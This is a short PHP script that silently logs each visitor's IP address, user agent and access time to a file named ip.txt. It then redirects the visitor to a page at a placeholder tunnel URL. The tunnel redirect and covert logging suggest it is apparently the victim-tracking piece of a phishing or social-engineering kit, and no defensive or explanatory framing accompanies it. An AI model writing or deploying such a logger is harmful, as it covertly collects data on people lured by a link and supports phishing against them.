<?php
// Capture IP first
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'];
}

$useragent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

$log = "IP: $ipaddress\nUser-Agent: $useragent\nTime: $timestamp\n\n";
file_put_contents('ip.txt', $log, FILE_APPEND);

// Redirect to client
header('Location: TUNNEL_URL/client2026.html');
exit;
?>